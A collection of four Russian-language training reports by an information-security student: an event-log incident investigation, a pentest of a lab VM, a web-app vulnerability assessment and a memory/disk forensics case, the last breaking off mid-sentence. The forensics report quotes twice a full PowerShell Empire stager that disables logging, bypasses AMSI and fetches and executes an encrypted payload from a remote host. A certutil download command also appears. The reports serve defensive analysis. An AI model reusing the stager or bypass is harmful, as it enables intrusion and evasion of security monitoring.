,PDF,Text,Meta
0,Securityevtx тестоввое задание.pdf,"В целях развития навыков в области расследования инцидентов информационной безопасности мной было выполнено тестовое задание.В рамках тестового задания была проведена работа с файлом журнала событий безопасности security.evtx, и найдены ответы на следующие вопросы:1. Перечислите подозрительные события (цепочка событий) с указанием TTP;2. Какое ПО загрузил злоумышленник на компьютер жертвы ( дайте его описание)?Вредоносное ПОВ ходе работы над данным кейсом, мной был применён подход «идти отобратного». Из всех событий, содержащихся в журнале событий безопасностиsecurity.evtx, явно выделяется с кодом 4688 от 01.09.2022 18:08:04. Пользователем «yr.fedotova» с использованием утилиты «certutil»  (certutil-urlcache -split -f http://200.200.200.250:8080/Qmxvb2Rob3VuZA.exe) былзагружен файл «Qmxvb2Rob3VuZA.exe». Неприметный на первый взгляд файл,который за счёт кодировки не воспринимается защитными решениями. Насамом же деле это закодированное в Base64 название инструмента«BloodHound». Bloodhound - это общедоступный и бесплатный инструмент, которыйиспользует графическую теорию для динамизации отношений и деталейбольшинства людей в среде Active Directory. BloodHound использует теориюграфов для выявления скрытых и часто непреднамеренных взаимосвязей всреде Active Directory. Злоумышленники могут использовать BloodHound дляпростого определения очень сложных путей атаки, которые в противном случаебыло бы невозможно быстро идентифицировать. Защитники могутиспользовать BloodHound для выявления и устранения тех же путей атаки. Каксиние, так и красные команды могут использовать BloodHound, чтобы легкополучить более глубокое понимание отношений привилегий в среде ActiveDirectory. Цепочка подозрительных событийОбнаружив событие, в результате которого было загружено вредоносноеПО,мной был проведён анализ журнала событий безопасности security.evtx напредмет действий, которые и привели злоумышленника к известномурезультату. Предполагаемая цепочка событий :2022-09-01 17:46:27.942 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 1102 ‖ high ‖ 284341 ‖Log Cleared ‖ SubjectDomainName: CYBER ¦ SubjectLogonId: 0x6fddf58 ¦SubjectUserName: yr.fedotova ¦ SubjectUserSid: S-1-5-21-1275329033-756244978-312112453-16232022-09-01 17:59:26.566 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ low ‖ 284669 ‖Susp CmdLine (Possible LOLBIN) ‖ CmdLine: rundll32.exeacmigration.dll,ApplyMigrationShims ¦ Path: C:\Windows\System32\rundll32.exe ¦PID: 0x2ff4 ¦ User: WKS2$ ¦ LID: 0x3e72022-09-01 17:59:26.604 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ low ‖ 284673 ‖Susp CmdLine (Possible LOLBIN) ‖ CmdLine: C:\WINDOWS\system32\DllHost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B} ¦ Path: C:\Windows\System32\dllhost.exe ¦ PID: 0x1734 ¦ User: WKS2$ ¦ LID: 0x3e72022-09-01 17:59:28.907 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ low ‖ 284710 ‖Susp CmdLine (Possible LOLBIN) ‖ CmdLine: C:\WINDOWS\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5} ¦ Path: C:\Windows\System32\dllhost.exe ¦ PID: 0xfb8 ¦ User: WKS2$ ¦ LID: 0x3e72022-09-01 17:59:30.998 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 5379 ‖ low ‖ 284725 ‖Credential Manager Accessed ‖ PID: 6180 ¦ SrcUser: yr.fedotova ¦ Tgt: XboxLive ¦CredsReturned: 1 ¦ ReturnCode: 3221226021 ¦ LID: 0x9fdc10a ¦ SrcSID: S-1-5-21-1275329033-756244978-312112453-16232022-09-01 18:00:27.701 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ low ‖ 284825 ‖Susp CmdLine (Possible LOLBIN) ‖ CmdLine: C:\WINDOWS\System32\dsregcmd.exe $(Arg0) $(Arg1) $(Arg2) ¦ Path: C:\Windows\System32\dsregcmd.exe ¦PID: 0x1b8 ¦ User: WKS2$ ¦ LID: 0x3e72022-09-01 18:02:06.032 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ low ‖ 284920 ‖Susp CmdLine (Possible LOLBIN) ‖ CmdLine: C:\WINDOWS\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5} ¦ Path: C:\Windows\System32\dllhost.exe ¦ PID: 0x220c ¦ User: WKS2$ ¦ LID: 0x3e72022-09-01 18:02:08.230 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ low ‖ 284922 ‖Susp CmdLine (Possible LOLBIN) ‖ CmdLine: C:\WINDOWS\system32\DllHost.exe /Processid:{7966B4D8-4FDC-4126-A10B-39A3209AD251} ¦ Path: C:\Windows\System32\dllhost.exe ¦ PID: 0x1ca4 ¦ User: WKS2$ ¦ LID: 0x3e72022-09-01 18:02:08.285 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ low ‖ 284923 ‖Susp CmdLine (Possible LOLBIN) ‖ CmdLine: C:\WINDOWS\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F} ¦ Path: C:\Windows\System32\dllhost.exe ¦ PID: 0x17c ¦ User: WKS2$ ¦ LID: 0x3e72022-09-01 18:02:30.597 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ low ‖ 284951 ‖Susp CmdLine (Possible LOLBIN) ‖ CmdLine: C:\WINDOWS\System32\rundll32.exe C:\WINDOWS\System32\shell32.dll,SHCreateLocalServerRunDll{9aa46009-3ce0-458a-a354-715610a075e6} -Embedding ¦ Path: C:\Windows\System32\rundll32.exe ¦ PID: 0x1a74 ¦ User: WKS2$ ¦ LID: 0x3e72022-09-01 18:04:01.172 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ high ‖ 285000 ‖Suspicious Process Parents ‖ CmdLine: C:\WINDOWS\system32\cmd.exe ¦ Path: C:\Windows\System32\cmd.exe ¦ PID: 0x480 ¦ User: yr.fedotova ¦ LID: 0x9fdc10a2022-09-01 18:04:05.330 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ low ‖ 285005 ‖Local Accounts Discovery ‖ CmdLine: whoami ¦ Path: C:\Windows\System32\whoami.exe ¦ PID: 0x14e8 ¦ User: yr.fedotova ¦ LID: 0x9fdc10a2022-09-01 18:04:05.330 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ med ‖ 285005 ‖Whoami Execution ‖ CmdLine: whoami ¦ Path: C:\Windows\System32\whoami.exe ¦PID: 0x14e8 ¦ User: yr.fedotova ¦ LID: 0x9fdc10a2022-09-01 18:04:10.943 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ low ‖ 285009 ‖Suspicious Execution of Systeminfo ‖ CmdLine: systeminfo ¦ Path: C:\Windows\System32\systeminfo.exe ¦ PID: 0x1544 ¦ User: yr.fedotova ¦ LID: 0x9fdc10a2022-09-01 18:04:30.438 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ low ‖ 285028 ‖Net.exe Execution ‖ CmdLine: net user yr.fedotova /domain ¦ Path: C:\Windows\System32\net.exe ¦ PID: 0x2640 ¦ User: yr.fedotova ¦ LID: 0x9fdc10a2022-09-01 18:04:30.470 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ low ‖ 285030 ‖Net.exe Execution ‖ CmdLine: C:\WINDOWS\system32\net1 user yr.fedotova/domain ¦ Path: C:\Windows\System32\net1.exe ¦ PID: 0x2864 ¦ User: yr.fedotova ¦LID: 0x9fdc10a2022-09-01 18:07:04.296 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ low ‖ 285094 ‖Suspicious Listing of Network Connections ‖ CmdLine: netstat ¦ Path: C:\Windows\System32\NETSTAT.EXE ¦ PID: 0x1600 ¦ User: yr.fedotova ¦ LID: 0x9fdc10a2022-09-01 18:08:04.908 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ high ‖ 285126 ‖Suspicious File Downloaded From Direct IP Via Certutil.EXE ‖ CmdLine: certutil -urlcache -split -f http://200.200.200.250:8080/Qmxvb2Rob3VuZA.exe ¦ Path: C:\Windows\System32\certutil.exe ¦ PID: 0x2d80 ¦ User: yr.fedotova ¦ LID: 0x9fdc10a2022-09-01 18:14:23.693 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ low ‖ 285234 ‖Susp CmdLine (Possible LOLBIN) ‖ CmdLine: C:\WINDOWS\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5} ¦ Path: C:\Windows\System32\dllhost.exe ¦ PID: 0x26a4 ¦ User: WKS2$ ¦ LID: 0x3e72022-09-01 18:14:24.051 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ low ‖ 285235 ‖Susp CmdLine (Possible LOLBIN) ‖ CmdLine: ""C:\WINDOWS\system32\mmc.exe""""C:\WINDOWS\system32\eventvwr.msc"" /s ¦ Path: C:\Windows\System32\mmc.exe ¦PID: 0x1ebc ¦ User: yr.fedotova ¦ LID: 0x9fdc10a2022-09-01 18:14:24.297 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ low ‖ 285241 ‖Susp CmdLine (Possible LOLBIN) ‖ CmdLine: ""C:\WINDOWS\system32\mmc.exe""""C:\WINDOWS\system32\eventvwr.msc"" /s ¦ Path: C:\Windows\System32\mmc.exe ¦PID: 0x93c ¦ User: WKS2$ ¦ LID: 0x3e72022-09-01 18:14:30.835 +04:00 ‖ wks2.cyber.camp ‖ Sec ‖ 4688 ‖ low ‖ 285243 ‖Susp CmdLine (Possible LOLBIN) ‖ CmdLine: C:\WINDOWS\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5} ¦ Path: C:\Windows\System32\dllhost.exe ¦ PID: 0x1a84 ¦ User: WKS2$ ¦ LID: 0x3e7TTP (тактики, техники, процедуры)В соответствии с матрицей MITRE ATT&CK был определён следующийперечень:Tactic: Defense Evasion- Obfuscated Files or Information (ID: T1027)Tactic: Credential Access- Credentials from Password Stores: Windows Credential Manager (ID: T1555.004)Tactic: Discovery- System Service Discovery (ID: T1007)- System Network Connections Discovery (ID: T1049)- Remote System Discovery (ID: T1018)- Network Share Discovery (ID: T1135)- Password Policy Discovery (ID: T1201)- Permission Groups Discovery (ID: T1069.001/ID: T1069.002)- Account Discovery: Local Account (ID: T1087.001/ID: T1087.002)- System Network Connections Discovery (ID: T1049)- System Information Discovery (ID: T1082)- System Owner/User Discovery (ID: T1033)Tactic: Lateral Movement- Remote Services: SMB/Windows Admin Shares (ID: T1021.002)Type: TOOL- Net (ID: S0039)Источники и используемые инструментыПри работе с данным кейсом я использовал не автоматизированный(ручной) анализ журнала событий безопасности security.evtx, а так жеинструмент «hayabusa».- https://attack.mitre.org/- https://bloodhound.readthedocs.io/en/latest/index.htmlОтчёт составил старший инженер (по защите информации) отделенияФПС ГПС эксплуатации средств связи, электронно-вычислительной техники изащиты информации управления связи, информационных технологий иавтоматизированных систем управления Главного управления МЧС России поУльяновской области старший лейтенант внутренней службы ШаманаевМаксим Андреевич.","{""/Author"": ""Max"", ""/CreationDate"": ""D:20231003220321+04'00'"", ""/Creator"": ""Writer"", ""/Producer"": ""LibreOffice 7.5""}"
1,Курсовой проект Защищённый контур.pdf,"Учебный проект.Отчёт о проведении анализа защищённостиI.Описательная частьВ рамках проведения анализа защищённости было рассмотреноприложение «Защищённый контур», установленное на ОС Linux (Ubuntu18.04).Компания разработчик поставляет уже настроенный сервер в виде OVA(md5 = 5935192d257a003b85584a84dec83367), который (по их заверениям)вполне безопасен и может использоваться ""из коробки"" (т.е. достаточноимпортировать в среду виртуализации и можно запускать в боевой среде).По информации, полученной от разработчика, цитата: ""приложениесодержит механизмы безопасности и может использоваться при построенииИСПД до 4 УЗ включительно и систем, обрабатывающих коммерческуютайну"".Документация на приложение разработчиком не предоставлена,поскольку, цитата: ""интерфейс интуитивно понятный, обучающихматериалов для пользователей не требуется"". Исходные коды так же непредоставлены.Вас, как специалиста, попросили выполнить анализ данногоприложения с точки зрения его реальной защищённости.II.Используемые программные\аппаратные средстваВ рамках проведения анализа защищённости были использованыследующие программные средства и утилиты:1.Virtual Box2.Kali Linux:a.Hydrab.patatorc.metasploit-frameworkd.sshe.ftpf.hpingg.nmap3.«Сканер-ВС» – система комплексного анализа защищенностиIII.Найденные уязвимостиВ результате проведения анализа защищённости были обнаруженыследующие уязвимости:1.FTP незашифрованный открытый текстУровень опасности: СреднийCVSS 2.0: 4.8Порт: 21/tcpОписание: На удаленном хосте запущена служба FTP, котораяпозволяет входить в систему открытым текстом через незашифрованныесоединения.Вектор CVSS 2.0: AV:A/AC:L/Au:N/C:P/I:P/A:NРекомендации: Включите FTPS или установите соединение спомощью команды «AUTH TLS». Посмотри пожалуйста Руководствослужбы FTP для получения дополнительной информации.2.Временные метки TCPУровень опасности: НизкийCVSS 2.0: 2.6Порт: -Описание: Удаленный хост реализует временные метки TCP ипоэтому позволяет вычислять время работыВектор CVSS 2.0: AV:N/AC:H/Au:N/C:P/I:N/A:NРекомендации: Чтобы отключить временные метки TCP в Linux,добавьте строку «net.ipv4.tcp_timestamps = 0» в /etc/sysctl.conf. Выполните'sysctl -p', чтобы применить настройки во время выполнения. Чтобыотключить временные метки TCP в Windows, выполните команду «netsh inttcp set global timestamps = disabled». Начиная с Windows Server 2008 и Vista,отметка времени не может быть полностью отключена. Поведение поумолчанию стека TCP / IP в этих системах - не использовать Параметрыотметок времени при инициализации TCP-соединений, но используйте их,если TCP-узел то есть инициирующая связь включает их в свой сегментсинхронизации (SYN). Смотрите ссылки для получения дополнительнойинформации.Подробнее: http://www.ietf.org/rfc/rfc1323.txthttp://www.microsoft.com/en-us/download/details.aspx?id=9152IV.Развёрнутое описание хода анализа защищённости и результатовПри анализе интересующей нас машины с помощью утилиты nmapбыли обнаружены следующие открытые порты:1.21/tcp           open    ftp                    vsftpd 3.0.32.22/tcp           open    ssh                   OpenSSH7.6p1 Ubuntu4ubuntu0.33.8888/tcp   open   http                   Golang net/http serverБыли предприняты попытки подбора паролей для подключения поэтим портам с помощью утилиты hydra методами подбора по словарю а также brute-force с генерацией пароля. Данная процедура не дала должныхрезультатов. Однако, удалось осуществить подключение по выданнымучётным данным пользователя system. После того, как соединение через порт21/ftp было установлено, был произведён анализ того, к чему имеет доступданный пользователь. Оказалось, что у данного пользователя есть доступ кфайловой системе, и в частности к файлу, в котором по умолчанию воперационных системах Linux хранятся имена пользователей и пароли(/etc/passwd и /etc/shadow), а так же к файлу, в котором сохраняется пароль отучётной записи администратора от сервиса «Защищённый контур»,работающего на порту 8888. Стоит отметить что у данного пользователя естьправа на передачу по ftp некоторых файлов.Используя учётные данные, полученные с интересующей системы поftp, удалось авторизоваться в сервисе «Защищённый контур» под учётнойзаписью администратора, далее создать дополнительную учётную запись смаксимальными правами доступа и удалить исходную учётную записьадминистратора, тем самым нарушив свойство доступности информационнойсистемы/сервиса для легитимного пользователя.Следующим шагом была предпринята попытка организации DOS атаки(посредством утилиты hping)  на сервис, работающий на порту 8888, котораяне увенчалась успехом.При анализе утилитой nmap было выявлено, что на порту 21функционирует сервис vsftpd версии 3.0.3. Для данной версии сервисаобнаружен эксплоит, вызывающий удалённый отказ в обслуживании, однакопроэксплуатировать его не удалось (https://www.exploit-db.com/exploits/49719 ).В завершении был проведён контрольный анализ на наличиеуязвимостей посредством СПО «Сканер-ВС», в ходе которого подтвердиласьуязвимость FTP, и была обнаружена уязвимость временных меток TCP.V.ЗаключениеУчитывая результаты анализа защищённости, рассматриваемуюсистему с установленным сервисом «Защищённый контур» можно считатьнезащищённой, содержащей не критические уязвимости и несоответствующей характеристикам, предоставленным разработчиком.В части соответствия требованиям Приказа ФСТЭК России №21 от 18февраля 2013 г. рассматриваемая система с установленным сервисом«Защищённый контур» не соответствует мерам по обеспечениюбезопасности персональных данных  ИАФ.4 (Управление средствамиаутентификации, в том числе хранение, выдача, инициализация,блокирование средств аутентификации и принятие мер в случае утраты и(или) компрометации средств аутентификации) а так же УПД.6 (Ограничениенеуспешных попыток входа в информационную систему (доступа кинформационной системе)). Для ИАФ.4 не выполняется мера «защита аутентификационнойинформации от неправомерных доступа к ней и модифицирования». Пароль,генерируемый сервисом «Защищённый контур» хранится в открытом виде,не зашифрован, и доступен пользователю system для просмотра и передачипо ftp. Мера УПД.6 «Ограничение неуспешных попыток входа винформационную систему (доступа к информационной системе)», невыполняется так как опытным путём было выявлено, что, даже после атакина подбор пароля с использованием утилит hydra и patator, адрес, с которогопроизводилась атака, был не заблокирован и была возможность продолжатьподбор паролей как в ручном, так и в автоматизированном режиме.Что касается разграничения доступа к информации в рамках«защищённого контура», то там действительно есть возможность наделенияпользователей правами доступа только к определённой категории данных(ПДн, коммерческая тайна). Однако стоит учитывать описанную ранееуязвимость, позволяющую добавлять нелегитимных пользователей с любымиправами. VI.Предлагаемые решения1.Включите FTPS или установите соединение с помощью команды«AUTH TLS». 2.Чтобы отключить временные метки TCP в Linux, добавьте строку«net.ipv4.tcp_timestamps = 0» в /etc/sysctl.conf. Выполните 'sysctl -p', чтобыприменить настройки во время выполнения. Чтобы отключить временныеметки TCP в Windows, выполните команду «netsh int tcp set global timestamps= disabled». Начиная с Windows Server 2008 и Vista, отметка времени неможет быть полностью отключена. Поведение по умолчанию стека TCP / IP вэтих системах - не использовать Параметры отметок времени приинициализации TCP-соединений, но используйте их, если TCP-узел то естьинициирующая связь включает их в свой сегмент синхронизации (SYN).3.Применение дополнительных средств защиты отнесанкционированного доступа, которые в том числе более качественноконтролировали бы доступ пользователей к файлам и папкам.4.Усовершенствовать сервис «Защищённый контур» в планешифрования паролей пользователей","{""/Author"": ""shaman"", ""/CreationDate"": ""D:20231003215342+04'00'"", ""/Creator"": ""Writer"", ""/Producer"": ""LibreOffice 7.5""}"
2,Учебный проект e-commerce.pdf,"Учебный проект.Отчёт о проведении комплексного исследования приложения иисходных кодовI.ЛегендаКомпания Y предоставляет комплексное веб-приложение в сфереэлектронной коммерции «Necommerce». Компания недавно столкнулась смассовой утечкой данных о своих пользователях и их покупках. «Брешь»,через которую произошла утечка, вроде как устранили.Саму разработку приложения компания Y заказывает у подрядчика —фирмы-разработчика.Своих специалистов по информационной безопасности у компании Yнет, поэтому вас пригласили провести комплексный анализ процессаразработки и протестировать на наличие других веб-уязвимостей. Детали понайденным и исправленным уязвимостям не дали, так как вы профессионал идолжны проверить всё с начала.Разработчики со стороны подрядчика также максимально пошли вам навстречу и предоставили исчерпывающую информацию о приложении — двессылки на репозитории с кодом:Frontend  .Backend  .По словам разработчиков:1.Вся разработка ведётся в приватных репозиториях в GitHub. Этолегенда, для удобства мы вам дали открытые репозитории.2.Весь код, а также зависимости и контейнеры, регулярно проходятпроверку открытыми инструментами:oDependabot  .oDetekt  .oSnyk   и т. д.3.Сам код покрыт автоматическими тестами, включая проверкумеханизмов безопасности (отработка неверных логинов и паролей), которыерегулярно прогоняются при каждом push в репозиторий.4.Разработчики прекрасно знакомы с OWASP Top 10, а некоторыедаже с ASVS и WSTG.5.Они придерживаются строгих правил разработки и не разрешаютотправлять push в master без соответствующего Code Review как минимумдвух человек и прохождения автоматизированных проверок.6.После прохождения всех проверок автоматически собираютсяобразы Docker и публикуются в GitHub Container Registry для дальнейшегоразворачивания в Production.II.ЗадачиКлючевая задача — провести комплексное исследованиефункционирующего приложения и исходных кодов.III.Используемые методыВ рамках комплексного исследования приложения «Necommerce» былииспользованы следующие практики, методы, сервисы и специальноепрограммное обеспечение:ZAP;SNYK; NMAP;TRIVY;IV.Обнаруженные уязвимостиПри ручном анализе репозиториев в них были обнаружены секреты (пары логин/пароль, Private_key)С использованием сервиса SNYK была обнаружена 261одна уязвимость. Основные уязвимости это старые версии базовых образов, старые версиипакетов и соответственно проблемы в зависимостях. В результате не своевременного обновления используемых пакетов ибиблиотек в веб приложении были обнаружены критические уязвимости скодами :На backend                                                                       На frontend:CVE-2022-1587                                                                                        CVE-2022-3570  CVE-2022-1586      CVE-2022-37434      CVE-2022-40674      CVE-2021-22945      CVE-2022-32207С использованием OWASP ZAP были обнаружены следующиеуязвимости:Неправильно сконфигурированный сервер nginx Не на всех страницах в коде страницы прописаны HTTP заголовки, такие какX-Content-Type-Options, X-Frame-Options, так же обнаружено отсутствиезаголовков  Content-Security-Policy. Отсутствие данных заголовков можетобернуться тем, веб-приложение будет подвержено xss, кликджекингу иатакам с использованием подмены MIME типов.При анализе репозиториев GitHub (Fork) мной не было обнаружено другихветок кроме “master”, а так же наличия pull request и issues, что можетсвидетельствовать о том что все обновления приложения заливались сразув “master” без code review.V.Рекомендации по устранению обнаруженных уязвимостей иулучшению процесса разработки1.Обновление базовых образов на backend: openjdk:11 до openjdk: 16.0.22.Обновление всех используемых пакетов и библиотек до актуальных версий(полный отчёт и соответственно список для обновления прилагается в архиве)3.Соблюдение практики code review (при таком подходе возможно будет устранена уязвимость с наличием секретов в коде)4.На всех страницах следует прописать заголовки следующего вида: X-XSS-Protection: 1; mode=block ;    X-Content-Type-Options: nosniff  ;    X-Frame-Options: DENY5.Использование в работе открытых инструментов для сканирования на уязвимости (Snyk,Trivy,OWASP ZAP).                                                     ","{""/Author"": ""\u041c\u0430\u043a\u0441\u0438\u043c \u0428\u0430\u043c\u0430\u043d\u0430\u0435\u0432"", ""/CreationDate"": ""D:20231003214009+04'00'"", ""/Creator"": ""Writer"", ""/Producer"": ""LibreOffice 7.5""}"
3,Учебный проект track forensics.pdf,"Дипломная работа по профессии «Специалист по информационнойбезопасности»Track ForensicsОписание инцидентаСлужбой безопасности компании «Х» была зафиксирована подозрительная сетевая активность. Вам нужно проанализировать ситуацию, расследовать инцидент и найти следы активности атакующих. У вас есть дамп оперативной памяти и побитовая копиядиска хоста, которые могут содержать информацию об инциденте. Вам нужно подготовить подробный отчёт о проведённом расследовании.Практические навыки, необходимые для выполнения дипломной работы:•работа с дампами оперативной памяти;•работа с побитовыми копиями;•анализ активности атакующих;•восстановление техник и тактик атакующих;•составление отчёта о криминалистическом исследовании.Исходные данные:•дамп оперативной памяти;•побитовая копия диска.Отчёт по заданию «Специалист по информационной безопасности»В ходе расследования в компании «Х», была обнаружена атака c с применениемфреймворка PowerShell Empire. На компьютер жертвы 2019-03-09 20:51:30 (GMT+04:00) был доставлен вредоносный файл (1) (он так же был продублирован в ещё 4 экземплярах с разным названиями Updater.bat;111.bat;2.bat;3.bat).Данный файл был получен из сети интернет В коде вредоносного .bat файла содержалась закодированная в base64 строка следующего содержания : «IF($PSVeRSiONTaBlE.PSVerSION.MajOr -gE 3){$GPF=[ref].ASsEmbly.GEtTYPe('System.Management.Automation.Utils').""GEtFie`ld""('cachedGroupPolicySettings','N'+'onPublic,Static');If($GPF){$GPC=$GPF.GeTVAlue($NUll);IF($GPC['ScriptB'+'lockLogging']){$GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$VAl=[ColLectIOns.GenErIC.DictIoNAry[sTRINg,SYStem.OBjECT]]::nEW();$VAl.ADd('EnableScriptB'+'lockLogging',0);$vAl.AdD('EnableScriptBlockInvocationLogging',0);$GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$vAL}ELSe{[ScrIptBlOCK].""GETFie`lD""('signatures','N'+'onPublic,Static').SEtValuE($nULl,(New-ObjecT ColLeCtIONs.GENERiC.HasHSET[sTRInG]))}[Ref].ASSeMbLY.GeTTypE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GetFIelD('amsiInitFailed','NonPublic,Static').SeTVAluE($nUlL,$TRue)};};[SYSTEm.Net.SERVicePointMANAgEr]::EXPeCT100COnTiNUe=0;$Wc=New-OBjeCT SYStem.NEt.WEBCLIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEADErS.ADD('User-Agent',$u);$WC.PrOXY=[SYstEm.NEt.WEBReQUeSt]::DeFaultWeBPRoxY;$WC.PROxy.CrEDentIaLS = [SYSTem.NET.CreDentiAlCacHE]::DEfaulTNetwORkCReDENtiaLs;$Script:Proxy = $wc.Proxy;$K=[SYsTEM.TeXT.EncoDING]::ASCII.GEtByTES(']hq1j)c#<Y5FR8X/Bvaw{&6.E!>K~zM%');$R={$D,$K=$ArGs;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CoUnt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOR$S[($S[$I]+$S[$H])%256]}};$ser='http://192.168.1.71:80';$t='/news.php';$Wc.HeaDERS.AdD(""Cookie"",""session=j+fv7S1TAsanHlr3sbDurnsydr4="");$DaTA=$WC.DOwnLoaDDATa($Ser+$t);$iV=$dAta[0..3];$DATA=$dAta[4..$dAta.leNGth];-jOIn[ChAR[]](& $R $DatA ($IV+$K))|IEX»Данный код позволяет установить сессию между компьютером жертвы и злоумышленника по адресу 192.168.1.71:80. Данные подтверждаются дампом сетевых соединений. Так же в данный скрипт позволяет использовать защиту от обнаружения средствами защиты. Так же сокрытие своих действие подтверждается выводом команды malfind, отображающей возможные внедрения кода.«Process: svchost.exe Pid: 2604 Address: 0x4dc0000Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITEFlags: CommitCharge: 256, MemCommit: 1, PrivateMemory: 1, Protection: 6»secsvc – служба защитника Windows.Запуск файла Updater.bat выполнялся под учётной записью пользователя Wilfred Далее злоумышленник получил доступ к процессу lsass.exe, отвечающему за аутентификацию пользователей, извлёк логины и пароли в файл password.txt, сохранив его на рабочем столе, вероятно с последующим получением на свой компьютер через уже открытое соединение. На компьютер жертвы так же были подгружены дополнительные инструменты для анализа сети и вероятно последующего продвижения по сети организации (в частности инструмент netscan).Предполагаемые используемые TTP:Initial Access - Valid Accounts ID: T1078Persistence, Privilege Escalation - ID: T1543.003Defense Evasion - Modify Registry ID: T1112; Impair Defenses ID: T1562Discovery - System Network Connections Discovery ID: T1049Рекомендации:1. Смена паролей пользователей2. Правильная настройка межсетевых экранов 3. Правильная настройка логирования действий на хостах (например введение дополнительного инструмента sysmon)4. Установка антивирусного решения которое будет контролировать соединения, проверять загруженные файлы и соответственно заберёт на себя функции защитника Windows.5. Обновить систему (Windows 7 уже довольно старая)6. Проведение комплексного расследования, так как атакующий хост находилсяв той же сети, и либо он тоже заражён и просто через него работал злоумышленник, либо это внутренний нарушитель.Ответы на дополнительные вопросыЧто касается изменения времени. Время менялось несколько раз, однако не все события можно отметить как подозрительные.Например Предыдущее время:  2019-03-10T09:00:18.596513400ZНовое время:  2019-03-10T09:00:18.596000000Z Или Предыдущее время:  2019-03-09T14:20:25.198760000ZНовое время:  2019-03-09T14:20:25.198000000ZМонжо отнести к синхрониазции и небольшой корректировкеА вот уже Предыдущее время:  2019-03-09T17:35:31.424080600ZНовое время:  2019-03-10T05:50:30.269000000ZИ Предыдущее время:  2019-03-10T01:17:06.039403200ZНовое время:  2019-03-09T14:17:07.164000000ZВызывают некоторые подозрения в связи с изменением времени и даты не большие промежутки не похожие на синхронизацию, а скорее на скачки туда-обратноБыли ли ps скрипты?Были. Скрипты были зашиты в .bat файлы и включали в том числе base 64 закодированные строкиpowershell -noP -sta -w 1 -enc if($psversiontable.psversion.major -ge 3){$gpf=[ref].assembly.gettype('system.management.automation.utils').""getfie`ld""('cachedgrouppolicysettings','n'+'onpublic,static');if($gpf){$gpc=$gpf.getvalue($null);if($gpc['scriptb'+'locklogging']){$gpc['scriptb'+'locklogging']['enablescriptb'+'locklogging']=0;$gpc['scriptb'+'locklogging']['enablescriptblockinvocationlogging']=0}$val=[collections.generic.dictionary[string,system.object]]::new();$val.add('enablescriptb'+'locklogging',0);$val.add('enablescriptblockinvocationlogging',0);$gpc['hkey_local_machine\software\policies\microsoft\windows\powershell\scriptb'+'locklogging']=$val}else{[scriptblock].""getfie`ld""('signatures','n'+'onpublic,static').setvalue($null,(new-object collections.generic.hashset[string]))}[ref].assembly.gettype('system.management.automation.amsiutils')|?{$_}|%{$_.getfield('amsiinitfailed','nonpublic,static').setvalue($null,$true)};};[system.net.servicepointmanager]::expect100continue=0;$wc=new-object system.net.webclient;$u='mozilla/5.0 (windows nt 6.1; wow64; trident/7.0; rv:11.0) like gecko';$wc.headers.add('user-agent',$u);$wc.proxy=[system.net.webrequest]::defaultwebproxy;$wc.proxy.credentials = [system.net.credentialcache]::defaultnetworkcredentials;$script:proxy = $wc.proxy;$k=[system.text.encoding]::ascii.getbytes(']hq1j)c#<y5fr8x/bvaw{&6.e!>k~zm%');$r={$d,$k=$args;$s=0..255;0..255|%{$j=($j+$s[$_]+$k[$_%$k.count])%256;$s[$_],$s[$j]=$s[$j],$s[$_]};$d|%{$i=($i+1)%256;$h=($h+$s[$i])%256;$s[$i],$s[$h]=$s[$h],$s[$i];$_-bxor$s[($s[$i]+$s[$h])%256]}};$ser='http://192.168.1.71:80';$t='/news.php';$wc.headers.add(""cookie"",""session=7rxvvoe8u52f96c5x6gucwtud44="");$data=$wc.downloaddata($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[char[]](& $r $data ($iv+$k))|iexПо поводу создания пользователей. Заметил что из под учётной записи Wilfred была создана учётная запись Support. Создана учетная запись пользователя.Субъект: Идентификатор безопасности:  S-1-5-21-3583694148-1414552638-2922671848-1003 Имя учетной записи:  Wilfred Домен учетной записи:  IEWIN7 Идентификатор входа:  0x8252A6Новая 